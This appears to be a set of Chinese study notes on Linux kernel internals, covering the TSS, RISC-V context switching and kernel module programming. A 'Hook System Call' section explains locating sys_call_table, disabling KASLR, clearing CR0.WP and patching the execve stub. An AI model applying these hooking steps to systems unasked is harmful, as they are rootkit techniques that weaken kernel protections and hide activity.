	struct m_inode * pwd;				// 当前工作目录i节点结构指针
	struct m_inode * root;				// 根目录i节点结构指针
	struct m_inode * executable;		// 执行文件i节点结构指针
	struct m_inode * library;			// 被加载库文件i节点结构指针
	unsigned long close_on_exec;		// 执行时关闭文件句柄位图标志.(include/fcntl.h)
	struct file * filp[NR_OPEN];		// 文件结构指针表,最多32项.表项号即是文件描述符的值
	/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */
	struct desc_struct ldt[3];			// 局部描述符表, 0 - 空,1 - 代码段cs,2 - 数据和堆栈段ds&amp;ss
	/* tss for this task */
	struct tss_struct tss;				// 进程的任务状态段信息结构
};
</code></pre>
<ul>
<li>这是上面提到的(<strong>TSS</strong>)<strong>task state segment</strong> 。我们可以看到这里保存了很多寄存器，维护process运行的context。在x86架构中tss数据结构是得到硬件支持的，所以在别的架构中，我们并没有看到这个数据结构。</li>
<li>我们注意到里面有3个ss(ss,ss0,ss1,ss2)，3个esp(esp0,esp1,esp2,esp3)。其中的ss0和esp0是用来索引kernel stack的，至于1和2，是因为intel架构有3个等级，但是在系统实现的时候我们并没有用到1和2。</li>
<li>我原本以为这个数据结构肯定是用来保存寄存器副本的。通过阅读源代码，在Linux0.12中似乎就是利用这个保存上下文，这个方法也挺好理解的。但是对于新版本的linux来说，tss的作用被大大的削弱了，似乎只是为了和Intel的架构对应，现在上下文的保存可以参考下面。</li>
</ul>
<pre><code class="language-c">struct tss_struct {
	long	back_link;			/* 16 high bits zero */
	long	esp0;
	long	ss0;				/* 16 high bits zero */
	long	esp1;
	long	ss1;				/* 16 high bits zero */
	long	esp2;
	long	ss2;				/* 16 high bits zero */
	long	cr3;
	long	eip;
	long	eflags;
	long	eax;
	long	ecx;
	long	edx;
	long	ebx;
	long	esp;
	long	ebp;
	long	esi;
	long	edi;
	long	es;					/* 16 high bits zero */
	long	cs;					/* 16 high bits zero */
	long	ss;					/* 16 high bits zero */
	long	ds;					/* 16 high bits zero */
	long	fs;					/* 16 high bits zero */
	long	gs;					/* 16 high bits zero */
	long	ldt;				/* 16 high bits zero */
    /*When a User Mode process attempts to access an I/O port by means of an in or out instruction, the CPU may need to access an I/O Permission Bitmap stored in the TSS to verify whether the process is allowed to address the port.*/
	long	trace_bitmap;		/*I/O port permission bitmap */
	struct i387_struct i387;
};
</code></pre>
<h3 id="具体实现-1"><a class="header" href="#具体实现-1">具体实现</a></h3>
<p>Linux0.12的进程切换是和硬件密不可分的。但是思想还是可以领悟的。留个坑待填。</p>
<h2 id="linux59-riscv的进程调度的上下文切换"><a class="header" href="#linux59-riscv的进程调度的上下文切换">Linux5.9-riscv的进程调度的上下文切换</a></h2>
<h3 id="数据结构-1"><a class="header" href="#数据结构-1">数据结构</a></h3>
<p>Linux5.9的task_struct太复杂了，不贴代码了。</p>
<pre><code class="language-c">//======arch/riscv/include/asm/thread_info.h==============
/*
 * low level task data that entry.S needs immediate access to
 * - this struct should fit entirely inside of one cache line
 * - if the members of this struct changes, the assembly constants
 *   in asm-offsets.c must be updated accordingly
 * - thread_info is included in task_struct at an offset of 0.  This means that
 *   tp points to both thread_info and task_struct.
 */
struct thread_info {
	unsigned long		flags;		/* low level flags */
	int                 preempt_count;  /* 0=&gt;preemptible, &lt;0=&gt;BUG */
	mm_segment_t		addr_limit;
	/*
	 * These stack pointers are overwritten on every system call or
	 * exception.  SP is also saved to the stack it can be recovered when
	 * overwritten.
	 */
	long		kernel_sp;	/* Kernel stack pointer */
	long		user_sp;	/* User stack pointer */
	int			cpu;
};
//===============/arch/riscv/include/asm/processor.h==================
//这个结构相当于是保存CPU中断过程中的上下文，所以我们注意到里面只有一个kernel 的sp。
/* CPU-specific state of a task */
struct thread_struct {
	/* Callee-saved registers */
	unsigned long ra;
	unsigned long sp;	/* Kernel mode stack */
	unsigned long s[12];	/* s[0]: frame pointer */
	struct __riscv_d_ext_state fstate;
};
//================/arch/riscv/kernel/process.c===================
void start_thread(struct pt_regs *regs, unsigned long pc,
	unsigned long sp)
{
	regs-&gt;status = SR_PIE;
	if (has_fpu) {
		regs-&gt;status |= SR_FS_INITIAL;
		/*
		 * Restore the initial value to the FP register
		 * before starting the user program.
		 */
		fstate_restore(current, regs);
	}
	regs-&gt;epc = pc;
	regs-&gt;sp = sp;
	set_fs(USER_DS);
}
</code></pre>
<p><strong>thread_info</strong>在task_struct的开头，<strong>thread_struct</strong>在task_struct的结尾。</p>
<h3 id="riscv的实现"><a class="header" href="#riscv的实现">RISCV的实现</a></h3>
<p>我们将Linux的调度分成四种情况：kernel thread的主动/被动调度，user thread的主动/被动调度。</p>
<h4 id="user-thread的被动调度"><a class="header" href="#user-thread的被动调度">User thread的被动调度</a></h4>
<p><img src="Advanced/Linux/LinuxKernel/../images/1604565709562.png" alt="" /></p>
<p>对应的源代码：</p>
<ol start="0">
<li>保存所有的可能被修改的寄存器，包括所有的通用寄存器和一些CSR</li>
</ol>
<pre><code>ENTRY(handle_exception)
    /*
        * If coming from userspace, preserve the user thread pointer and load
        * the kernel thread pointer.  If we came from the kernel, the scratch
        * register will contain 0, and we should continue on the current TP.
        */
    csrrw tp, CSR_SCRATCH, tp
    bnez tp, _save_context

_restore_kernel_tpsp:
    csrr tp, CSR_SCRATCH
    REG_S sp, TASK_TI_KERNEL_SP(tp)
_save_context:
    REG_S sp, TASK_TI_USER_SP(tp)
    REG_L sp, TASK_TI_KERNEL_SP(tp)
    addi sp, sp, -(PT_SIZE_ON_STACK)
    REG_S x1,  PT_RA(sp)
    REG_S x3,  PT_GP(sp)
    REG_S x5,  PT_T0(sp)
    REG_S x6,  PT_T1(sp)
    REG_S x7,  PT_T2(sp)
    REG_S x8,  PT_S0(sp)
    REG_S x9,  PT_S1(sp)
    REG_S x10, PT_A0(sp)
    REG_S x11, PT_A1(sp)
    REG_S x12, PT_A2(sp)
    REG_S x13, PT_A3(sp)
    REG_S x14, PT_A4(sp)
    REG_S x15, PT_A5(sp)
    REG_S x16, PT_A6(sp)
    REG_S x17, PT_A7(sp)
    REG_S x18, PT_S2(sp)
    REG_S x19, PT_S3(sp)
    REG_S x20, PT_S4(sp)
    REG_S x21, PT_S5(sp)
    REG_S x22, PT_S6(sp)
    REG_S x23, PT_S7(sp)
    REG_S x24, PT_S8(sp)
    REG_S x25, PT_S9(sp)
    REG_S x26, PT_S10(sp)
    REG_S x27, PT_S11(sp)
    REG_S x28, PT_T3(sp)
    REG_S x29, PT_T4(sp)
    REG_S x30, PT_T5(sp)
    REG_S x31, PT_T6(sp)
</code></pre>
<ol>
<li>是否要schedule选择，有一个变量task_struct中有一个变量<strong>need_reshced</strong>，我们根据他的值判断是否要进行调度，关注“need——resched”</li>
</ol>
<pre><code>;entry.S 329行
#if IS_ENABLED(CONFIG_PREEMPTION)
resume_kernel:
REG_L s0, TASK_TI_PREEMPT_COUNT(tp)
bnez s0, restore_all
REG_L s0, TASK_TI_FLAGS(tp)
andi s0, s0, _TIF_NEED_RESCHED
beqz s0, restore_all
call preempt_schedule_irq
j restore_all
#endif

work_pending:
/* Enter slow path for supplementary processing */
la ra, ret_from_exception
andi s1, s0, _TIF_NEED_RESCHED
bnez s1, work_resched
work_notifysig:
/* Handle pending signals and notify-resume requests */
csrs CSR_STATUS, SR_IE /* Enable interrupts for do_notify_resume() */
move a0, sp /* pt_regs */
move a1, s0 /* current_thread_info-&gt;flags */
tail do_notify_resume
work_resched:
tail schedule

</code></pre>
<ol start="2">
<li>switch其实是一个宏定义，真正的内容在entry.S。我们会恢复我们在中断处理过程中的上下文，例如sp会切换我们的栈，ra让我们能返回到上次中断处理后的返回部分。</li>
</ol>
<pre><code>;/arch/riscv/kernel/entry.S 第389行
/*
* Integer register context switch
* The callee-saved registers must be saved and restored.
*
*   a0: previous task_struct (must be preserved across the switch)
*   a1: next task_struct
*
* The value of a0 and a1 must be preserved by this function, as that's how
* arguments are passed to schedule_tail.
*/
ENTRY(__switch_to)
/* Save context into prev-&gt;thread */
li    a4,  TASK_THREAD_RA
add   a3, a0, a4
add   a4, a1, a4
REG_S ra,  TASK_THREAD_RA_RA(a3)
REG_S sp,  TASK_THREAD_SP_RA(a3)
REG_S s0,  TASK_THREAD_S0_RA(a3)
REG_S s1,  TASK_THREAD_S1_RA(a3)
REG_S s2,  TASK_THREAD_S2_RA(a3)
REG_S s3,  TASK_THREAD_S3_RA(a3)
REG_S s4,  TASK_THREAD_S4_RA(a3)
REG_S s5,  TASK_THREAD_S5_RA(a3)
REG_S s6,  TASK_THREAD_S6_RA(a3)
REG_S s7,  TASK_THREAD_S7_RA(a3)
REG_S s8,  TASK_THREAD_S8_RA(a3)
REG_S s9,  TASK_THREAD_S9_RA(a3)
REG_S s10, TASK_THREAD_S10_RA(a3)
REG_S s11, TASK_THREAD_S11_RA(a3)
/* Restore context from next-&gt;thread */
REG_L ra,  TASK_THREAD_RA_RA(a4)
REG_L sp,  TASK_THREAD_SP_RA(a4)
REG_L s0,  TASK_THREAD_S0_RA(a4)
REG_L s1,  TASK_THREAD_S1_RA(a4)
REG_L s2,  TASK_THREAD_S2_RA(a4)
REG_L s3,  TASK_THREAD_S3_RA(a4)
REG_L s4,  TASK_THREAD_S4_RA(a4)
REG_L s5,  TASK_THREAD_S5_RA(a4)
REG_L s6,  TASK_THREAD_S6_RA(a4)
REG_L s7,  TASK_THREAD_S7_RA(a4)
REG_L s8,  TASK_THREAD_S8_RA(a4)
REG_L s9,  TASK_THREAD_S9_RA(a4)
REG_L s10, TASK_THREAD_S10_RA(a4)
REG_L s11, TASK_THREAD_S11_RA(a4)
/* Swap the CPU entry around. */
lw a3, TASK_TI_CPU(a0)
lw a4, TASK_TI_CPU(a1)
sw a3, TASK_TI_CPU(a1)
sw a4, TASK_TI_CPU(a0)
/* The offset of thread_info in task_struct is zero. */
move tp, a1
ret
ENDPROC(__switch_to)

/* switch_to宏
* 有趣的是这里有三个参数
#define switch_to(prev, next, last)			\
do {							\
struct task_struct *__prev = (prev);		\
struct task_struct *__next = (next);		\
if (has_fpu)					\
    __switch_to_aux(__prev, __next);	\
((last) = __switch_to(__prev, __next));		\
} while (0)
</code></pre>
<ol start="3">
<li>恢复所有的寄存器</li>
</ol>
<pre><code>;/arch/riscv/kernel/entry.S 第254行
restore_all:
#ifdef CONFIG_TRACE_IRQFLAGS
REG_L s1, PT_STATUS(sp)
andi t0, s1, SR_PIE
beqz t0, 1f
call trace_hardirqs_on
j 2f
1:
call trace_hardirqs_off
2:
#endif
REG_L a0, PT_STATUS(sp)
/*
    * The current load reservation is effectively part of the processor's
    * state, in the sense that load reservations cannot be shared between
    * different hart contexts.  We can't actually save and restore a load
    * reservation, so instead here we clear any existing reservation --
    * it's always legal for implementations to clear load reservations at
    * any point (as long as the forward progress guarantee is kept, but
    * we'll ignore that here).
    *
    * Dangling load reservations can be the result of taking a trap in the
    * middle of an LR/SC sequence, but can also be the result of a taken
    * forward branch around an SC -- which is how we implement CAS.  As a
    * result we need to clear reservations between the last CAS and the
    * jump back to the new context.  While it is unlikely the store
    * completes, implementations are allowed to expand reservations to be
    * arbitrarily large.
    */
REG_L  a2, PT_EPC(sp)
REG_SC x0, a2, PT_EPC(sp)

csrw CSR_STATUS, a0
csrw CSR_EPC, a2

REG_L x1,  PT_RA(sp)
REG_L x3,  PT_GP(sp)
REG_L x4,  PT_TP(sp)
REG_L x5,  PT_T0(sp)
REG_L x6,  PT_T1(sp)
REG_L x7,  PT_T2(sp)
REG_L x8,  PT_S0(sp)
REG_L x9,  PT_S1(sp)
REG_L x10, PT_A0(sp)
REG_L x11, PT_A1(sp)
REG_L x12, PT_A2(sp)
REG_L x13, PT_A3(sp)
REG_L x14, PT_A4(sp)
REG_L x15, PT_A5(sp)
REG_L x16, PT_A6(sp)
REG_L x17, PT_A7(sp)
REG_L x18, PT_S2(sp)
REG_L x19, PT_S3(sp)
REG_L x20, PT_S4(sp)
REG_L x21, PT_S5(sp)
REG_L x22, PT_S6(sp)
REG_L x23, PT_S7(sp)
REG_L x24, PT_S8(sp)
REG_L x25, PT_S9(sp)
REG_L x26, PT_S10(sp)
REG_L x27, PT_S11(sp)
REG_L x28, PT_T3(sp)
REG_L x29, PT_T4(sp)
REG_L x30, PT_T5(sp)
REG_L x31, PT_T6(sp)

REG_L x2,  PT_SP(sp)

#ifdef CONFIG_RISCV_M_MODE
mret
#else
sret
#endif
</code></pre>
<ol start="4">
<li>首先，每一个process都对应有一个kernel stack和user stack，在RISCV中没有辅助的硬件帮我们切换。所以我们每次都在kernel stack中保存两套寄存器，进入的时候拿出来kernel sp，保存user sp。</li>
</ol>
<pre><code>;arch/riscv/kernel/entry.S，第29行
_restore_kernel_tpsp:
    csrr tp, CSR_SCRATCH
    REG_S sp, TASK_TI_KERNEL_SP(tp)
_save_context:
    REG_S sp, TASK_TI_USER_SP(tp)
    REG_L sp, TASK_TI_KERNEL_SP(tp)
</code></pre>
<p>最后我们回答这个问题：因为不需要。寄存器其实保存在系统栈里了。</p>
<h4 id="kernel-thread的被动调度"><a class="header" href="#kernel-thread的被动调度">Kernel Thread的被动调度</a></h4>
<p>明确一点的是，kernel thread的切换属于单纯的context switch，不涉及mode的切换。和user mode差不多。</p>
<p>（留个坑）</p>
<h4 id="kernel-thread的主动调度"><a class="header" href="#kernel-thread的主动调度">Kernel thread的主动调度</a></h4>
<p>对于kernel thread，想要主动调度可以直接调用schedule()，返回地址会被存在ra里。</p>
<p>然后我们在之后的switch_to中，会把ra保存到thread_struct中，准确来说所有的callee saved register我们都会保存。对于caller saved register，这个我们要求先前的kernel thread自己保存。然后切换出下一个进程的一套寄存器。</p>
<p>这样当我们返回的时候，返回地址已经变成了next进程。</p>
<h4 id="user-thread的主动调度"><a class="header" href="#user-thread的主动调度">User Thread的主动调度</a></h4>
<p>通过pause()系统调用实现这个功能。具体的我还没看。</p>
<h3 id="kernel-stack的结构"><a class="header" href="#kernel-stack的结构">Kernel Stack的结构</a></h3>
<p><a href="https://wenboshen.org/posts/2015-12-18-kernel-stack.html">申老师的blog</a>，是谷歌&quot;why there is no pc in thread_struct&quot;的第一个搜索结果。</p>
<p>task_struct，thread_info存储在和thread对应的kernel stack相同的位置（或者说是在栈顶占了2个Page）</p>
<pre><code class="language-c">//=======/include/linux/sched.h 第1679行
union thread_union {
#ifndef CONFIG_ARCH_TASK_STRUCT_ON_STACK
	struct task_struct task;
#endif
#ifndef CONFIG_THREAD_INFO_IN_TASK
	struct thread_info thread_info;
#endif
	unsigned long stack[THREAD_SIZE/sizeof(long)];
};
</code></pre>
<p><img src="https://wenboshen.org/assets/image/kernel_stack_layout.png" alt="申老师主页的图片" /></p>
<center>上面那个图不是riscv，寄存器存在一点出入</center>
<ul>
<li><code>pt_regs</code> is at the high end of kernel stack, is mainly used for saving user registers in user-kernel mode switching. Therefore, after returning to user space, the first instruction get executed is at <code>pt_regs-&gt;pc</code>.这个部分就是我们从umode进入smode，在entry.S开头部分保存的寄存器。</li>
<li><code>cpu_context</code> is in task_struct-&gt;thread_struct, is mainly used for saving registers of context switch. So right after context switch to a process, its <code>cpu_context-&gt;pc</code> will get executed.这个部分是用来做kernel thread的context switch的，所以只需要保存好callee saved的寄存器就好了，其他的寄存器由caller自己决定保存与否。</li>
</ul>
<p>我现在决定我可能搞清楚了kernel thread的主动调度和user thread的被动调度，但是kernel thread是怎么被动调度的呢？一般这个情况就是time int了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux内核编程笔记"><a class="header" href="#linux内核编程笔记">Linux内核编程笔记</a></h1>
<p>参考链接 :</p>
<ul>
<li><a href="https://www.kernel.org/doc/Documentation/kbuild/modules.txt">如何编译LKM</a></li>
<li><a href="https://onestraw.github.io/linux/lkm-and-syscall-hook/">如何hook system call</a></li>
<li>The Linux Kernel Module Programming Guide</li>
<li><a href="https://segmentfault.com/a/1190000039302294">如何阅读源码</a></li>
</ul>
<h2 id="lkm-hello-world"><a class="header" href="#lkm-hello-world">LKM-Hello World</a></h2>
<p>让我们先从一个最小的LKM开始看起。包含以下内容。</p>
<ol>
<li><code>include&lt;linux/module.h&gt;</code>. 那些宏就定义在这里。</li>
<li>一些必要的宏定义，<code>MODULE_XXC</code></li>
<li>定义<code>hooked_init</code>和<code>hooked_exit</code>，更准确的说是模块的构造和析构函数的编写，然后再最后用宏<code>module_init</code>和<code>module_exit</code>把他们注册好。</li>
<li>请用<code>tab</code>作为缩进，内核编程的规范。</li>
</ol>
<pre><code class="language-c">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt; /* Needed for pr_info() */
#include &lt;linux/init.h&gt; /* Needed for the macros */
/*
** module macros
*/
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;reticence&quot;);
MODULE_DESCRIPTION(&quot;hook exec&quot;);

/*
** module constructor/destructor
*/

static int  __init hooked_init(void)
{
	pr_info(&quot;+ Loading hook_exec module\n&quot;);
	return 0;
}

static void __exit hooked_exit(void)
{
	pr_info(&quot;+ Unloading hook_mkdir module\n&quot;);
}

module_init(hooked_init);
module_exit(hooked_exit);
</code></pre>
<p>构建的话，参考https://www.kernel.org/doc/Documentation/kbuild/modules.txt。首先安装必要的工具</p>
<pre><code class="language-sh"> sudo apt-get install build-essential kmod  linux-headers-`uname -r`
</code></pre>
<p>MAKEFILE:</p>
<pre><code class="language-makefile">obj-m += hook_exec.o
 
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre>
<p>使用：</p>
<pre><code class="language-sh">sudo insmod hook_exec.ko  # 装载模块
sudo rmmod hook_exec.ko   # 卸载模块
dmesg	# 查看日志
</code></pre>
<h2 id="functions-available-to-modules"><a class="header" href="#functions-available-to-modules">Functions available to modules</a></h2>
<p>The definition for the symbols comes from the kernel itself; the only external functions you can use are the ones provided by the kernel. If you’re curious about what symbols have been exported by your kernel, take a look at <code>/proc/kallsyms</code>.</p>
<p><code>/proc/kallsyms</code>里面存储了kernel中的所有符号，但不都是可用的。在Linux 5.4-5.7，可以使用<code>kallsyms_lookup_name</code>对符号进行查找，但是之后这个符号没有被导出。</p>
<p><code>/lib/modules/&lt;kernel-version&gt;/build/Module.symvers</code>存储了<strong>所有被导出的符号</strong>。从2.6版本开始，在内核中使用EXPORT_SYMBOL或EXPORT_SYMBOL_GPL导出的符号可以在其他内核模块中直接使用。</p>
<p>还有一点，就是<strong>宏</strong>定义并不算是符号。你可以使用某些宏定义，比如<code>pr_info</code>等。</p>
<h2 id="hook-system-call"><a class="header" href="#hook-system-call">Hook System Call</a></h2>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/syscalls.h#L414">系统调用的函数原型</a></p>
<p>源代码在 <code>arch/$(architecture)/kernel/entry.S</code>, after the line <code>ENTRY(system_call)</code>.</p>
<h3 id="如何找到syscall-table"><a class="header" href="#如何找到syscall-table">如何找到syscall table</a></h3>
<p><code>sys_call_table</code>没有被直接导出，下面这个办法是最简单的最普适的。</p>
<pre><code class="language-sh"># 注意sudo是必须的
sudo cat kallsyms | grep sys_call_table
</code></pre>
<p>另外，KASLR(Kernel Address Space Layout Randomization)会在每一次启动的时候将地址布局随机化。如果打开，那么每次开机都需要查看符号地址，如果没打开，符号地址会一直是我们查到的那个。你可以把他关掉。</p>
<pre><code class="language-sh">grep GRUB_CMDLINE_LINUX_DEFAULT /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;
sudo perl -i -pe 'm/quiet/ and s//quiet nokaslr/' /etc/default/grub
grep quiet /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nokaslr splash&quot;
sudo update-grub
</code></pre>
<h3 id="x86的内存保护"><a class="header" href="#x86的内存保护">x86的内存保护</a></h3>
<p>我们需要把cr0.wp清零，才可以在kernel mode对RO内存进行write。</p>
<blockquote>
<p>CR0.WP allows pages to be protected from supervisor-mode writes. If <code>CR0.WP = 0</code>, supervisor-mode write accesses are allowed to linear addresses with read-only access rights; if <code>CR0.WP = 1</code>, they are not. (User-mode write accesses are never allowed to linear addresses with read-only access rights, regardless of the value of CR0.WP.)</p>
</blockquote>
<p>Linux v5.7, the kernel patched the series of control-flow enforcement (CET) for x86, CET is disabled since v5.11.</p>
<h3 id="stub机制绕过"><a class="header" href="#stub机制绕过">stub机制绕过</a></h3>
<p>在至少Linux3.2-Linux4.6，对一些重要的System Call(比如execve)有一个Stub机制，</p>
<p>举例<a href="https://elixir.bootlin.com/linux/v4.4/source/arch/x86/entry/entry_64.S#L383">Linux4.4的代码</a>. Syscall table的<code>__NR_execve</code>指向的就是这里，然而这里并不是<code>sys_execve</code>的直接入口，而是做了一个间接的跳转。如果需要Hook，就需要修改call指令的后面指示的偏移量。因为是PC相对地址的偏移计算，并不难。</p>
<pre><code class="language-c">ENTRY(stub_execve)
	call	sys_execve
return_from_execve:
	testl	%eax, %eax
	jz	1f
	/* exec failed, can use fast SYSRET code path in this case */
	ret
1:
	/* must use IRET code path (pt_regs-&gt;cs may have changed) */
	addq	$8, %rsp
	ZERO_EXTRA_REGS
	movq	%rax, RAX(%rsp)
	jmp	int_ret_from_sys_call
END(stub_execve)
</code></pre>
<h3 id="退出"><a class="header" href="#退出">退出</a></h3>
<p>如果hook的system call还没有返回，但是我的模块被卸载了。当从original call返回到我hook的函数的时候，由于地址已经被释放，所以就出问题了。</p>
<p>有三个解决办法：</p>
<ol>
<li>在卸载之前先sleep一会儿，这个可以解决大部分问题。</li>
<li>通过加锁做一个thread safe的counter，每次调用+1返回-1，直到是0才真正退出。这个是解决问题的根本方法。如果你的系统调用可能会sleep，那建议用这种办法。接口可以使用<a href="https://elixir.bootlin.com/linux/v4.14.14/source/include/linux/atomic.h#L531">include/linux/atomic.h</a></li>
<li>不卸载。</li>
</ol>
<p>https://stackoverflow.com/questions/15628996/ioctl-write-crashing。不过貌似现在的内核已经会自己做检查了，不需要考虑这个。</p>
<h2 id="如何获取当前进程信息"><a class="header" href="#如何获取当前进程信息">如何获取当前进程信息</a></h2>
<p>我们知道，在Linux中进程信息被存储在<code>task_struct</code>中。在内核中，有一个全局变量<code>current</code>指向当前进程的<code>task_struct</code>。</p>
<p>举例Linux5.15的代码<a href="https://elixir.bootlin.com/linux/latest/source/include/asm-generic/current.h#L8">asm-generic/current.h</a>，这个宏的具体实现和架构有关。</p>
<pre><code class="language-c">#define current get_current()
</code></pre>
<p>有了current，进程的信息还不是手到擒来，想要什么信息直接在<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L723">task_struct</a>里头取就好了，例如getpwd.</p>
<pre><code class="language-c">#include &lt;asm/current.h&gt;
#include &lt;linux/fs_struct.h&gt;
#include &lt;linux/dcache.h&gt;

int xxx() {
    char pwd[PATH_MAX];
	get_fs_pwd(current-&gt;fs,&amp;path);
	p = dentry_path_raw(path.dentry, pwd, PATH_MAX);
	pr_info(&quot;pwd = %s&quot;,p);
}
</code></pre>
<h3 id="打开的文件"><a class="header" href="#打开的文件">打开的文件</a></h3>
<p>task_struct中有两个字段，files字段是打开的文件列表。<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fdtable.h#L49">/include/linux/fdtable.h</a>中查看<code>files_struct</code>的详细定义</p>
<pre><code class="language-c">/* Filesystem information: */
struct fs_struct		*fs;
/* Open file information: */
struct files_struct		*files;
</code></pre>
<p>怎么通过fs_struct获得files_struct呢？（准确的说，怎么从文件描述符找到对应的文件）。参考<a href="https://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module">stackoverflow</a>，给出下面一段从fd获得filename的程序</p>
<pre><code class="language-c">inline int check_filename(int fd) {
    char* tmp;
    char* pathname;
    struct file* file;
    struct path* path;

    spin_lock(&amp;current-&gt;files-&gt;file_lock);
#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 11, 0)
    file = lookup_fd_rcu(fd);
#else
    file = fcheck(fd);
#endif

    if (!file) {
        spin_unlock(&amp;current-&gt;files-&gt;file_lock);
        return -ENOENT;
    }

    path = &amp;file-&gt;f_path;
    path_get(path);
    spin_unlock(&amp;current-&gt;files-&gt;file_lock);

    tmp = (char*)__get_free_page(GFP_KERNEL);

    if (!tmp) {
        path_put(path);
        return -ENOMEM;
    }

    pathname = d_path(path, tmp, PAGE_SIZE);
    path_put(path);

    if (IS_ERR(pathname)) {
        free_page((unsigned long)tmp);
        return PTR_ERR(pathname);
    }

    // Your code here

    free_page((unsigned long)tmp);
    return 0;
}
</code></pre>
<h2 id="加锁"><a class="header" href="#加锁">加锁</a></h2>
<p>为了实现同步，我们需要加锁。有两种锁，Mutex和Spin。Spin是自旋锁，适用于小范围的代码加锁，代价小。Mutex如果发现无法获得锁是会休眠的，代价大。</p>
<p>简单的说，最基本的使用就三个。第一个是定义并初始化mutex，是一个宏。后面分别是加锁和释放锁。源代码参考<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/mutex.h#L165">/include/linux/mutex.h</a></p>
<pre><code class="language-c">static DEFINE_MUTEX(my_lock);
mutex_lock(&amp;my_lock);
mutex_unlock(&amp;my_lock);
</code></pre>
<p>spinlock类似，源代码参考<a href="https://elixir.bootlin.com/linux/latest/source/tools/include/linux/spinlock.h#L13">/include/linux/spinlock.h</a></p>
<pre><code class="language-c">static DEFINE_SPINLOCK(my_lock);
spin_lock(&amp;my_lock);
spin_unlock(&amp;my_lock);
</code></pre>
<p>关于这两个锁的使用场景，更详细的参考https://www.kernel.org/doc/html/v4.13/kernel-hacking/locking.html</p>
<div class="table-wrapper"><table><thead><tr><th>应用场合</th><th>信号量or自旋锁</th></tr></thead><tbody>
<tr><td>低开销加锁（临界区执行时间较快）</td><td>优先选择自旋锁</td></tr>
<tr><td>低开销加锁（临界区执行时间较长）</td><td>优先选择信号量</td></tr>
<tr><td>临界区可能包含<a href="https://www.kernel.org/doc/htmldocs/kernel-locking/sleeping-things.html">引起睡眠的代码</a></td><td>不能选自旋锁，可以选择信号量。（自旋锁会禁止抢占？这一点存疑）</td></tr>
<tr><td>临界区位于中断上下文时，此时<strong>不能睡眠</strong></td><td>优先选择自旋锁，即使选择信号量也只能用down_trylock非阻塞的方式</td></tr>
</tbody></table>
</div>
<p>https://elixir.bootlin.com/linux/v4.14.14/source/include/linux/atomic.h#L531</p>
<h2 id="崩溃信息"><a class="header" href="#崩溃信息">崩溃信息</a></h2>
<p>崩溃信息如果可以通过串口重定向到文件才好分析。</p>
<h3 id="给虚拟机连接串口"><a class="header" href="#给虚拟机连接串口">给虚拟机连接串口</a></h3>
<p>VMware的虚拟机关机时，VM-&gt;Setting-&gt;Hardware-&gt;Add，添加串口设备。采用output file，定向到某个文件比如log.txt。</p>
<p>然后打开虚拟机，通过<code>dmesg | grep tty</code>分析大概是哪个设备，通常就是ttyS1。然后在root权限下<code>echo aaa &gt;&gt; /dev/ttyS1</code>，看看log.txt是不是增加了aaa。</p>
<h3 id="修改grub"><a class="header" href="#修改grub">修改grub</a></h3>
<pre><code class="language-sh">sudo vim /etc/default/grub  
GRUB_CMDLINE_LINUX=&quot;console=ttyS1,115200n8 console=tty0 ignore_loglevel&quot;
sudo update-grub  
</code></pre>
<p>然后，你就会发现输出都重定向来了，哈哈。</p>
<h2 id="ftrace"><a class="header" href="#ftrace">ftrace</a></h2>
<p><a href="https://linux.cn/article-9838-1.html">简单的介绍</a></p>
<h2 id="ebpf"><a class="header" href="#ebpf">eBPF</a></h2>
<p>https://ebpf.io/</p>
<h2 id="函数参数传递规则"><a class="header" href="#函数参数传递规则">函数参数传递规则</a></h2>
<p>在64位中，参数传递依次按照寄存器RDI，RSI，RDX，RCX，R8，R9的顺序传递。</p>
<p>系统调用的时候，情况有点特殊。</p>
<ul>
<li>在4.17版本（有待确认）之前，参数按照上面的顺序传递。</li>
<li>在4.17版本之后，参数实际上是存在RDI指向的一个结构中的。</li>
</ul>
<h2 id="动态分配内存"><a class="header" href="#动态分配内存">动态分配内存</a></h2>
<p>参考驱动的代码https://elixir.bootlin.com/linux/latest/source/drivers/block/zram/zram_drv.c#L507</p>
<h2 id="user和kernel数据交换"><a class="header" href="#user和kernel数据交换">User和Kernel数据交换</a></h2>
<p><code>copy_from_user</code>和<code>copy_to_user</code></p>
<p>用<code>access_ok</code>检查用户指针是否合法（在用户的地址空间内），<code>addr_limit</code>是User Space和Kernel Space的分界，合法的用户指针应该小于<code>addr_limit</code>。</p>
<p><code>set_fs</code>和<code>get_fs</code>让我们可以修改<code>addr_limit</code>，是非常危险的函数。 </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数据结构-2"><a class="header" href="#数据结构-2">数据结构</a></h1>
<p>内核中一堆用宏实现的数据结构，每次看都直呼WC。叫我写是这辈子都不可能写出来的。很多都是非侵入性（non-intrusive）（解释可以参考stackoverflow上的<a href="https://stackoverflow.com/questions/5004162/what-does-it-mean-for-a-data-structure-to-be-intrusive">一个例子</a>）的数据结构，在加上宏，让没有模板和泛型的C语言也可以编写出具有通用性的数据结构。</p>
<h2 id="hashtable"><a class="header" href="#hashtable">hashtable</a></h2>
<p>头文件在<a href="https://elixir.bootlin.com/linux/v4.1/source">/</a><a href="https://elixir.bootlin.com/linux/v4.1/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/hashtable.h">hashtable.h</a>。哈希表是一个非侵入性的数据结构。</p>
<p>定义一个hash_table。第一个参数就是定义的hash_table的名字，第二个参数是hash_table拥有的“桶”的数量，是固定的，所以请估计好数据量。</p>
<pre><code class="language-c">/* 定义 */
DEFINE_HASHTABLE(htable, 3);
/* 初始化 */
